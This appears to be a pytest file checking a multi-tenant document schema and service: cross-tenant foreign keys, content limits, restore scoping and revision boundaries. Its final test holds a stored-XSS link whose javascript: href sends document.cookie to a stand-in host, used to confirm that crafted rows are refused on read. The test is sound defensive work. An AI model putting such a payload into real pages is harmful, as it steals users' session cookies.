"""Migration 023 applied by the real runner, then asked what it built -- and
the two rules the schema deliberately does not hold, asked of the service.

023 adds three tables that all point at rows a client names by id: documents,
the versions they used to be, and the discussion about them. Every one of those
ids arrives from a browser, so every one of them is a chance to reach into
another tenant -- and the answer has to be the database, not the service. A
resolver that scopes its lookup correctly is right until somebody writes a
second one, and the second one is where this class of bug lives.

So most of the assertions below are about rows PostgreSQL will not store:

  * a document on another workspace's PROJECT -- the requirement the whole file
    is shaped around, and the one `favorites` in 019 makes the same way;
  * a document on another workspace's initiative;
  * a document written or last edited by somebody who is not a member here,
    which is the impersonation a single-column key to `users (id)` would
    accept;
  * a revision of another workspace's document, and one attributed to a
    non-member;
  * a comment on another workspace's document, and one by a non-member;
  * a document claiming a project AND an initiative;
  * content that is not a JSON object, and content larger than the column
    admits.

Three more are about the shape being useful rather than safe: the content
CHECKs on `documents` and `document_revisions` admit the same thing (so a
revision cannot be one the live table would refuse -- which would be a history
entry nobody could ever restore), deleting a document with history is RESTRICT
rather than a silent cascade, and the ordinary paths work at all, without which
the refusals prove nothing.

The rest of the file is the two things a CHECK cannot express and which
therefore cannot be tested without a running server:

  * RESTORING ACROSS TENANTS. `DocumentRepository.restore` selects the revision
    by workspace AND document AND id in one statement, so a revision id from
    another tenant -- or a real revision of a different document -- writes
    nothing. That is a property of a statement, not of a constraint.
  * THE REVISION BOUNDARY. Whether an edit starts a new version depends on who
    edited last and when, which is two columns and a clock. The interesting
    assertion is the NEGATIVE one: a person typing continuously must NOT
    produce a revision per save, because a history with four hundred entries
    for one afternoon is a history nobody opens.

And one that spans both: a crafted row written by a hand-run UPDATE is refused
on the way OUT of the repository, so the schema is not the only thing standing
between a stored payload and a reader's browser.

Marked `db`: deselected by default, skipped when Docker is unreachable.
"""

import json
from uuid import UUID

import asyncpg
import pytest

from app.domain.documents import (
    MAX_CONTENT_CHARACTERS,
    InvalidStoredContentError,
)
from app.domain.errors import ValidationError
from app.domain.tenancy import WorkspaceScope
from app.repositories.documents import DocumentRepository
from app.services.documents import DocumentService

from tests.conftest import apply_all_migrations, reset_schema


pytestmark = pytest.mark.db

# The tenant 002 seeds, named there as literals precisely so a test can assert
# against a constant instead of querying for the value it is about to check.
BOOTSTRAP_WORKSPACE_ID = UUID("00000000-0000-7000-8000-000000000001")

# The other tenant: a real workspace with a real member, a real project, a real
# initiative and a real document, whose rows every cross-tenant assertion below
# tries and fails to reach. It has to be real -- a nonexistent id would be
# refused by any spelling of these constraints and would prove nothing about
# which one is in force.
OTHER_WORKSPACE_ID = UUID("00000000-0000-7000-8000-0000000000a1")
OTHER_TEAM_ID = UUID("00000000-0000-7000-8000-0000000000a2")

MEMBER_ID = UUID("00000000-0000-7000-8000-0000000000e1")
SECOND_MEMBER_ID = UUID("00000000-0000-7000-8000-0000000000e3")
OUTSIDER_ID = UUID("00000000-0000-7000-8000-0000000000e2")

PROJECT_ID = UUID("00000000-0000-7000-8000-0000000000c1")
OTHER_PROJECT_ID = UUID("00000000-0000-7000-8000-0000000000c3")

INITIATIVE_ID = UUID("00000000-0000-7000-8000-0000000000d1")
OTHER_INITIATIVE_ID = UUID("00000000-0000-7000-8000-0000000000d3")

DOCUMENT_ID = UUID("00000000-0000-7000-8000-0000000000b1")
OTHER_DOCUMENT_ID = UUID("00000000-0000-7000-8000-0000000000b2")

SCOPE = WorkspaceScope(workspace_id=BOOTSTRAP_WORKSPACE_ID)
OTHER_SCOPE = WorkspaceScope(workspace_id=OTHER_WORKSPACE_ID)

EMPTY_DOCUMENT = '{"type": "doc", "content": []}'

INSERT_USER_SQL = """
INSERT INTO users (id, email, password_hash)
VALUES (
    $1::uuid,
    'user-' || $1::text || '@example.test',
    '$argon2id$not-a-real-hash'
)
"""

INSERT_DOCUMENT_SQL = """
INSERT INTO documents (
    id, workspace_id, title, content, project_id, initiative_id,
    creator_id, last_edited_by
)
VALUES ($1, $2, $3, $4::JSONB, $5, $6, $7, $8)
"""

INSERT_REVISION_SQL = """
INSERT INTO document_revisions (
    workspace_id, document_id, title, content, author_id
)
VALUES ($1, $2, $3, $4::JSONB, $5)
"""

INSERT_COMMENT_SQL = """
INSERT INTO document_comments (workspace_id, document_id, author_id, body)
VALUES ($1, $2, $3, $4)
"""

# The definition a CHECK actually enforces, read back out of the catalog rather
# than out of the file. `pg_get_constraintdef` renders what the server holds,
# which is the thing a drifting constant would disagree with.
CONSTRAINT_DEFINITION_SQL = """
SELECT pg_get_constraintdef(oid)
FROM pg_constraint
WHERE conname = $1
"""


async def seed(connection) -> None:
    """Two fully-populated tenants, symmetric on purpose.

    Every cross-tenant assertion here is "workspace A's row reaching for
    workspace B's", and a fixture where the far side did not really exist would
    pass those assertions for the wrong reason -- a foreign key refuses a
    nonexistent id under every spelling, including the single-column one this
    migration exists to avoid.
    """
    await connection.execute(
        "INSERT INTO workspaces (id, slug, name) VALUES ($1, $2, $3)",
        OTHER_WORKSPACE_ID,
        "acme",
        "Acme",
    )
    await connection.execute(
        "INSERT INTO teams (id, workspace_id, name, key) VALUES ($1, $2, $3, $4)",
        OTHER_TEAM_ID,
        OTHER_WORKSPACE_ID,
        "Acme Core",
        "ACME",
    )

    for user_id, workspace_id in (
        (MEMBER_ID, BOOTSTRAP_WORKSPACE_ID),
        (SECOND_MEMBER_ID, BOOTSTRAP_WORKSPACE_ID),
        (OUTSIDER_ID, OTHER_WORKSPACE_ID),
    ):
        await connection.execute(INSERT_USER_SQL, user_id)
        await connection.execute(
            "INSERT INTO workspace_members (workspace_id, user_id, role) "
            "VALUES ($1, $2, $3)",
            workspace_id,
            user_id,
            "member",
        )

    for project_id, workspace_id in (
        (PROJECT_ID, BOOTSTRAP_WORKSPACE_ID),
        (OTHER_PROJECT_ID, OTHER_WORKSPACE_ID),
    ):
        await connection.execute(
            "INSERT INTO projects (id, workspace_id, name, state) "
            "VALUES ($1, $2, $3, 'planned')",
            project_id,
            workspace_id,
            "A project",
        )

    for initiative_id, workspace_id in (
        (INITIATIVE_ID, BOOTSTRAP_WORKSPACE_ID),
        (OTHER_INITIATIVE_ID, OTHER_WORKSPACE_ID),
    ):
        await connection.execute(
            "INSERT INTO initiatives (id, workspace_id, name, status) "
            "VALUES ($1, $2, $3, 'planned')",
            initiative_id,
            workspace_id,
            "A goal",
        )

    for document_id, workspace_id, author_id in (
        (DOCUMENT_ID, BOOTSTRAP_WORKSPACE_ID, MEMBER_ID),
        (OTHER_DOCUMENT_ID, OTHER_WORKSPACE_ID, OUTSIDER_ID),
    ):
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            document_id,
            workspace_id,
            "Handbook",
            EMPTY_DOCUMENT,
            None,
            None,
            author_id,
            author_id,
        )


@pytest.fixture
async def connection(postgres_dsn):
    """A migrated database with two fully-populated tenants."""
    conn = await asyncpg.connect(postgres_dsn)

    try:
        await reset_schema(conn)
        await apply_all_migrations(conn)
        await seed(conn)

        yield conn
    finally:
        await reset_schema(conn)
        await conn.close()


@pytest.fixture
async def pool(postgres_dsn):
    """The same two tenants, reachable through a pool a service can hold.

    A separate fixture rather than one that yields both, because the service
    tests below open transactions of their own and a connection shared with the
    fixture would have them interleaving with the seed.
    """
    conn = await asyncpg.connect(postgres_dsn)

    try:
        await reset_schema(conn)
        await apply_all_migrations(conn)
        await seed(conn)
    finally:
        await conn.close()

    created = await asyncpg.create_pool(dsn=postgres_dsn, min_size=1, max_size=2)

    try:
        yield created
    finally:
        await created.close()


@pytest.fixture
def service(pool) -> DocumentService:
    return DocumentService(pool=pool, repository=DocumentRepository())


# --------------------------------------------------- rows that are not rows


async def test_a_document_cannot_hang_off_another_workspaces_project(connection):
    """The requirement the whole migration is shaped around.

    Both foreign keys read the ONE `workspace_id` on the row, so a document
    filed in this workspace against a project owned by another has no value of
    that column that satisfies both parents. `REFERENCES projects (id)` would
    have accepted this row without a word, leaving "is this project actually
    ours?" as a rule every future resolver has to remember.
    """
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=1),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            EMPTY_DOCUMENT,
            OTHER_PROJECT_ID,
            None,
            MEMBER_ID,
            MEMBER_ID,
        )

    assert raised.value.constraint_name == "documents_project_fk"


async def test_a_document_cannot_hang_off_another_workspaces_initiative(connection):
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=2),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            EMPTY_DOCUMENT,
            None,
            OTHER_INITIATIVE_ID,
            MEMBER_ID,
            MEMBER_ID,
        )

    assert raised.value.constraint_name == "documents_initiative_fk"


async def test_a_document_cannot_be_attributed_to_a_non_member(connection):
    """The impersonation a single-column key to `users (id)` would accept.

    OUTSIDER_ID is a real account with a real membership -- in the OTHER
    workspace. `REFERENCES users (id)` is satisfied by every account in the
    installation, so it would have recorded this person as the author of a
    document in a workspace they have never been in.
    """
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=3),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            EMPTY_DOCUMENT,
            None,
            None,
            OUTSIDER_ID,
            OUTSIDER_ID,
        )

    assert raised.value.constraint_name == "documents_creator_fk"


async def test_the_last_editor_is_checked_as_well_as_the_creator(connection):
    """Two columns, two constraints. One index on the pair would not do it.

    A schema that pinned only the creator would let a document be marked as
    last edited by somebody from another tenant -- which is the field the
    revision boundary rule compares against, so the next edit's history entry
    would be attributed to a stranger.
    """
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=4),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            EMPTY_DOCUMENT,
            None,
            None,
            MEMBER_ID,
            OUTSIDER_ID,
        )

    assert raised.value.constraint_name == "documents_last_editor_fk"


async def test_a_document_may_not_claim_a_project_and_an_initiative(connection):
    """One row that would have to render in two places and be moved twice."""
    with pytest.raises(asyncpg.CheckViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=5),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            EMPTY_DOCUMENT,
            PROJECT_ID,
            INITIATIVE_ID,
            MEMBER_ID,
            MEMBER_ID,
        )

    assert raised.value.constraint_name == "documents_one_parent"


async def test_a_document_may_belong_to_neither(connection):
    """Both NULL is a workspace-level document -- the handbook, the onboarding
    guide -- and is probably the common case. `= 1` instead of `<= 1` would
    have made it unrepresentable."""
    await connection.execute(
        INSERT_DOCUMENT_SQL,
        UUID(int=6),
        BOOTSTRAP_WORKSPACE_ID,
        "Handbook",
        EMPTY_DOCUMENT,
        None,
        None,
        MEMBER_ID,
        MEMBER_ID,
    )

    assert (
        await connection.fetchval(
            "SELECT count(*) FROM documents WHERE id = $1", UUID(int=6)
        )
        == 1
    )


@pytest.mark.parametrize("content", ["[]", "42", '"a string"', "null"])
async def test_content_that_is_not_an_object_is_refused(connection, content):
    """The floor beneath `parse_content`.

    These are not documents anyone can author through the API; they are what a
    hand-written INSERT or a future second writer produces. Caught before the
    row exists rather than on the read that would have to fail in front of a
    reader.
    """
    with pytest.raises(asyncpg.CheckViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=7),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            content,
            None,
            None,
            MEMBER_ID,
            MEMBER_ID,
        )

    assert raised.value.constraint_name == "documents_content_is_object"


async def test_a_document_bigger_than_the_column_admits_is_refused(connection):
    """The ceiling that stops one row being used to store a file.

    It matters more here than for a comment because every revision copies it.
    """
    oversized = json.dumps({"type": "doc", "note": "x" * 600_000})

    with pytest.raises(asyncpg.CheckViolationError) as raised:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=8),
            BOOTSTRAP_WORKSPACE_ID,
            "Spec",
            oversized,
            None,
            None,
            MEMBER_ID,
            MEMBER_ID,
        )

    assert raised.value.constraint_name == "documents_content_length"


async def test_the_service_bound_is_reached_before_the_column_bound(connection):
    """A document the service accepts is one the column accepts.

    The two measure different strings -- PostgreSQL renders `": "` where this
    application renders `":"` -- so an equal pair would let a document pass
    validation and then fail the CHECK, surfacing as a masked internal error
    rather than as a field error. This inserts the largest document the service
    would ever hand over and asserts the server keeps it.
    """
    at_the_limit = json.dumps(
        {"type": "doc", "note": "x" * (MAX_CONTENT_CHARACTERS - 40)}
    )

    assert len(at_the_limit) <= MAX_CONTENT_CHARACTERS

    await connection.execute(
        INSERT_DOCUMENT_SQL,
        UUID(int=9),
        BOOTSTRAP_WORKSPACE_ID,
        "Spec",
        at_the_limit,
        None,
        None,
        MEMBER_ID,
        MEMBER_ID,
    )


async def test_a_revision_cannot_be_written_against_another_workspaces_document(
    connection,
):
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_REVISION_SQL,
            BOOTSTRAP_WORKSPACE_ID,
            OTHER_DOCUMENT_ID,
            "Handbook",
            EMPTY_DOCUMENT,
            MEMBER_ID,
        )

    assert raised.value.constraint_name == "document_revisions_document_fk"


async def test_a_revision_cannot_be_attributed_to_a_non_member(connection):
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_REVISION_SQL,
            BOOTSTRAP_WORKSPACE_ID,
            DOCUMENT_ID,
            "Handbook",
            EMPTY_DOCUMENT,
            OUTSIDER_ID,
        )

    assert raised.value.constraint_name == "document_revisions_author_fk"


async def test_a_comment_cannot_be_written_on_another_workspaces_document(connection):
    """007's guarantee about `comments`, restated on the table that mirrors it.

    A comment claiming this workspace on a document owned by another has no
    workspace_id that satisfies `document_comments_document_fk`.
    """
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_COMMENT_SQL,
            BOOTSTRAP_WORKSPACE_ID,
            OTHER_DOCUMENT_ID,
            MEMBER_ID,
            "Looks good",
        )

    assert raised.value.constraint_name == "document_comments_document_fk"


async def test_a_comment_cannot_be_attributed_to_a_non_member(connection):
    with pytest.raises(asyncpg.ForeignKeyViolationError) as raised:
        await connection.execute(
            INSERT_COMMENT_SQL,
            BOOTSTRAP_WORKSPACE_ID,
            DOCUMENT_ID,
            OUTSIDER_ID,
            "Looks good",
        )

    assert raised.value.constraint_name == "document_comments_author_fk"


# --------------------------------------------------- shape, not just safety


async def test_the_two_content_checks_admit_the_same_thing(connection):
    """A revision must be restorable into the table it came from.

    If `document_revisions` accepted content `documents` would refuse, a
    history entry could exist that nobody could ever restore -- a version
    visible in the list and unreachable by the one button beside it. Read out
    of the catalog rather than out of the file, because what the server
    enforces is the thing a drifting constant would disagree with.
    """
    for suffix in ("content_is_object", "content_length"):
        document_check = await connection.fetchval(
            CONSTRAINT_DEFINITION_SQL, f"documents_{suffix}"
        )
        revision_check = await connection.fetchval(
            CONSTRAINT_DEFINITION_SQL, f"document_revisions_{suffix}"
        )

        assert document_check == revision_check, suffix


async def test_deleting_a_document_with_history_is_refused_not_cascaded(connection):
    """RESTRICT, so `DocumentService.delete` has to exist.

    CASCADE would make one `DELETE FROM documents` destroy a document's whole
    history and discussion while reporting `DELETE 1`. Whether that history is
    destroyed is a decision worth writing out in a service where it can be read
    and changed.
    """
    await connection.execute(
        INSERT_REVISION_SQL,
        BOOTSTRAP_WORKSPACE_ID,
        DOCUMENT_ID,
        "Handbook",
        EMPTY_DOCUMENT,
        MEMBER_ID,
    )

    # RestrictViolationError specifically, and not the ForeignKeyViolationError
    # every other refusal in this file raises. asyncpg makes them siblings
    # rather than parent and child, so naming the narrower one is what pins the
    # referential ACTION -- a key silently switched to NO ACTION would still be
    # a foreign key violation and would still pass a looser assertion, while
    # deferring the check to commit time.
    with pytest.raises(asyncpg.RestrictViolationError) as raised:
        await connection.execute("DELETE FROM documents WHERE id = $1", DOCUMENT_ID)

    assert raised.value.constraint_name == "document_revisions_document_fk"


async def test_deleting_a_document_with_comments_is_refused_not_cascaded(connection):
    """The one place this file departs from 007, stated as a test.

    `comments_issue_fk` is CASCADE. Every key here is RESTRICT instead, so the
    ordering lives in `DocumentService.delete` rather than in a clause that
    rewrites a table the DELETE did not name.
    """
    await connection.execute(
        INSERT_COMMENT_SQL,
        BOOTSTRAP_WORKSPACE_ID,
        DOCUMENT_ID,
        MEMBER_ID,
        "Looks good",
    )

    with pytest.raises(asyncpg.RestrictViolationError) as raised:
        await connection.execute("DELETE FROM documents WHERE id = $1", DOCUMENT_ID)

    assert raised.value.constraint_name == "document_comments_document_fk"


async def test_the_ordinary_paths_work(connection):
    """Without this the refusals above prove nothing.

    A schema that rejected everything would pass every test in the section
    above and be useless.
    """
    await connection.execute(
        INSERT_DOCUMENT_SQL,
        UUID(int=20),
        BOOTSTRAP_WORKSPACE_ID,
        "Spec",
        EMPTY_DOCUMENT,
        PROJECT_ID,
        None,
        MEMBER_ID,
        MEMBER_ID,
    )
    await connection.execute(
        INSERT_REVISION_SQL,
        BOOTSTRAP_WORKSPACE_ID,
        UUID(int=20),
        "Spec",
        EMPTY_DOCUMENT,
        MEMBER_ID,
    )
    await connection.execute(
        INSERT_COMMENT_SQL,
        BOOTSTRAP_WORKSPACE_ID,
        UUID(int=20),
        MEMBER_ID,
        "Looks good",
    )

    assert (
        await connection.fetchval(
            "SELECT count(*) FROM document_revisions WHERE document_id = $1",
            UUID(int=20),
        )
        == 1
    )
    assert (
        await connection.fetchval(
            "SELECT count(*) FROM document_comments WHERE document_id = $1",
            UUID(int=20),
        )
        == 1
    )


# -------------------------------------------------- restoring across tenants


async def revision_ids(pool, document_id) -> list[UUID]:
    async with pool.acquire() as connection:
        rows = await connection.fetch(
            "SELECT id FROM document_revisions WHERE document_id = $1 "
            "ORDER BY created_at, id",
            document_id,
        )

    return [row["id"] for row in rows]


async def test_a_revision_cannot_be_restored_across_tenants(pool, service):
    """The headline refusal, and one no constraint can make.

    Workspace A holds a document. Workspace B holds a document and a revision
    of it. B's revision id is a UUID like any other, and a caller in A can send
    it -- so the only thing between "restore version 3" and "write another
    tenant's writing into my document" is that the statement selects the
    revision by workspace AND document AND id together.

    The document A names is its own, so nothing about the request looks wrong
    until the revision is looked up. That is exactly the shape that gets missed
    by a resolver which checks the document and then trusts the rest.
    """
    async with pool.acquire() as connection:
        await connection.execute(
            INSERT_REVISION_SQL,
            OTHER_WORKSPACE_ID,
            OTHER_DOCUMENT_ID,
            "Their secret plan",
            json.dumps(
                {
                    "type": "doc",
                    "content": [
                        {
                            "type": "paragraph",
                            "content": [
                                {"type": "text", "text": "confidential"},
                            ],
                        },
                    ],
                }
            ),
            OUTSIDER_ID,
        )

    stolen = (await revision_ids(pool, OTHER_DOCUMENT_ID))[0]

    with pytest.raises(ValidationError) as raised:
        await service.restore(
            scope=SCOPE,
            document_id=DOCUMENT_ID,
            revision_id=stolen,
            editor_id=MEMBER_ID,
        )

    assert [(issue.field, issue.code) for issue in raised.value.issues] == [
        ("revisionId", "NOT_FOUND")
    ]

    # And nothing was written. The refusal happens inside the transaction that
    # took the snapshot, so the rollback is what makes the failed restore leave
    # no trace -- an assertion about the transaction boundary as much as about
    # the predicate.
    async with pool.acquire() as connection:
        title = await connection.fetchval(
            "SELECT title FROM documents WHERE id = $1", DOCUMENT_ID
        )

    assert title == "Handbook"
    assert await revision_ids(pool, DOCUMENT_ID) == []


async def test_a_revision_of_another_document_in_the_same_workspace_is_refused(
    pool, service
):
    """Same tenant, wrong parent, and the answer has to be the same.

    A workspace-scoped predicate alone would accept this: the revision really
    is in this workspace. It is the `document_id` half of the same statement
    that stops one document's history being written into another.
    """
    async with pool.acquire() as connection:
        await connection.execute(
            INSERT_DOCUMENT_SQL,
            UUID(int=30),
            BOOTSTRAP_WORKSPACE_ID,
            "Other spec",
            EMPTY_DOCUMENT,
            None,
            None,
            MEMBER_ID,
            MEMBER_ID,
        )
        await connection.execute(
            INSERT_REVISION_SQL,
            BOOTSTRAP_WORKSPACE_ID,
            UUID(int=30),
            "Other spec, older",
            EMPTY_DOCUMENT,
            MEMBER_ID,
        )

    wrong_parent = (await revision_ids(pool, UUID(int=30)))[0]

    with pytest.raises(ValidationError):
        await service.restore(
            scope=SCOPE,
            document_id=DOCUMENT_ID,
            revision_id=wrong_parent,
            editor_id=MEMBER_ID,
        )


async def test_restoring_preserves_the_version_it_replaces(pool, service):
    """A restore is an edit, not a rewind -- so it is itself undoable.

    Snapshotting first is what makes "I restored the wrong one" recoverable. It
    is unconditional, with no boundary heuristic, because a restore is an
    explicit act: somebody chose to replace what is there.
    """
    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=MEMBER_ID,
        title="Handbook v2",
        snapshot=True,
    )

    original = (await revision_ids(pool, DOCUMENT_ID))[0]

    restored = await service.restore(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        revision_id=original,
        editor_id=SECOND_MEMBER_ID,
    )

    assert restored.title == "Handbook"
    # Two revisions now: the one that was restored FROM, and the one the
    # restore itself displaced.
    assert len(await revision_ids(pool, DOCUMENT_ID)) == 2
    # The restore is attributed to whoever performed it, not to the author of
    # the version they chose -- a history that said otherwise would claim
    # somebody wrote something at a time they did not.
    assert restored.last_edited_by == SECOND_MEMBER_ID


async def test_another_workspace_cannot_read_a_documents_body(pool, service):
    """The batching loader's read is scoped too.

    A loader keyed on the id alone would be a cache indexed by half of what
    identifies a row; this is the statement behind it, asked directly.
    """
    contents = await service.contents_for_documents(
        scope=OTHER_SCOPE,
        document_ids=[DOCUMENT_ID],
    )

    assert contents == {}


# ------------------------------------------------------ the revision boundary


async def revision_count(pool, document_id) -> int:
    return len(await revision_ids(pool, document_id))


async def test_one_person_typing_does_not_produce_a_version_per_save(pool, service):
    """The negative assertion, and the reason the whole boundary rule exists.

    An editor autosaves every few seconds. If every save were a version, one
    afternoon's writing would be four hundred history entries -- a list nobody
    opens, which is the same as having no history at all.
    """
    for word in ("one", "two", "three", "four"):
        await service.edit(
            scope=SCOPE,
            document_id=DOCUMENT_ID,
            editor_id=MEMBER_ID,
            content={
                "type": "doc",
                "content": [
                    {"type": "paragraph", "content": [{"type": "text", "text": word}]},
                ],
            },
        )

    assert await revision_count(pool, DOCUMENT_ID) == 0


async def test_a_second_editor_starts_a_new_version(pool, service):
    """Handing over is a boundary whatever the clock says.

    Without this, Ana's paragraph and Ben's deletion of it coalesce into one
    version attributed to Ben, and "what did it say before they touched it" --
    the thing a history is actually for -- is gone.
    """
    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=MEMBER_ID,
        title="Ana's draft",
    )

    assert await revision_count(pool, DOCUMENT_ID) == 0

    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=SECOND_MEMBER_ID,
        title="Ben's rewrite",
    )

    async with pool.acquire() as connection:
        row = await connection.fetchrow(
            "SELECT title, author_id FROM document_revisions WHERE document_id = $1",
            DOCUMENT_ID,
        )

    # The version preserved is what ANA wrote, attributed to Ana -- not to Ben,
    # who caused the snapshot. Recording the snapshotter would attribute every
    # version to the person who replaced it.
    assert row["title"] == "Ana's draft"
    assert row["author_id"] == MEMBER_ID


async def test_a_gap_starts_a_new_version(pool, service):
    """One continuous session is one version; coming back starts another.

    The gap is faked by back-dating `updated_at`, which is the only way to test
    a ten-minute rule in under a second. That it is the column being compared,
    and not a timer somewhere, is exactly what makes this testable at all.
    """
    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=MEMBER_ID,
        title="Before lunch",
    )

    assert await revision_count(pool, DOCUMENT_ID) == 0

    async with pool.acquire() as connection:
        await connection.execute(
            "UPDATE documents SET updated_at = now() - interval '1 hour' WHERE id = $1",
            DOCUMENT_ID,
        )

    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=MEMBER_ID,
        title="After lunch",
    )

    assert await revision_count(pool, DOCUMENT_ID) == 1


async def test_an_explicit_save_starts_a_new_version(pool, service):
    """The author knows better than the heuristic, and may say so."""
    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=MEMBER_ID,
        title="Draft",
    )
    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=MEMBER_ID,
        title="Final",
        snapshot=True,
    )

    assert await revision_count(pool, DOCUMENT_ID) == 1


async def test_re_sending_what_the_document_already_says_writes_nothing(pool, service):
    """A blur with no typing in between must not become a version.

    Nor an `updated_at` stamp: a document marked as modified because a client
    re-sent what it already had is a lie that propagates into every "recently
    changed" list built on that column. The comparison is made by PostgreSQL,
    so key order and whitespace do not count -- which is what "unchanged"
    actually means for a document tree.
    """
    unchanged = {"type": "doc", "content": []}

    async with pool.acquire() as connection:
        before = await connection.fetchval(
            "SELECT updated_at FROM documents WHERE id = $1", DOCUMENT_ID
        )

    await service.edit(
        scope=SCOPE,
        document_id=DOCUMENT_ID,
        editor_id=SECOND_MEMBER_ID,
        title="Handbook",
        # Spelled with the keys the other way round and with whitespace, which
        # is a different STRING and the same document.
        content=json.loads('{ "content" : [] , "type" : "doc" }'),
        snapshot=True,
    )

    async with pool.acquire() as connection:
        after = await connection.fetchval(
            "SELECT updated_at FROM documents WHERE id = $1", DOCUMENT_ID
        )

    assert after == before
    assert await revision_count(pool, DOCUMENT_ID) == 0
    assert unchanged == {"type": "doc", "content": []}


# --------------------------------------- the parse on the way out, end to end


async def test_a_crafted_row_never_reaches_a_reader(pool, service):
    """The schema is not the only thing between a payload and a browser.

    This writes a link mark with a `javascript:` href straight into the column,
    the way a hand-run UPDATE, a bulk import or a restored backup would. Every
    constraint on the table is satisfied: it is a JSON object of a legal size.
    Only the parse the repository runs on the way OUT refuses it -- and it
    refuses it as a defect rather than as something the reader did wrong.
    """
    payload = json.dumps(
        {
            "type": "doc",
            "content": [
                {
                    "type": "paragraph",
                    "content": [
                        {
                            "type": "text",
                            "text": "click",
                            "marks": [
                                {
                                    "type": "link",
                                    "attrs": {
                                        "href": "javascript:fetch('//evil.test/'+document.cookie)"
                                    },
                                }
                            ],
                        },
                    ],
                },
            ],
        }
    )

    async with pool.acquire() as connection:
        await connection.execute(
            "UPDATE documents SET content = $2::JSONB WHERE id = $1",
            DOCUMENT_ID,
            payload,
        )

    with pytest.raises(InvalidStoredContentError):
        await service.contents_for_documents(
            scope=SCOPE,
            document_ids=[DOCUMENT_ID],
        )
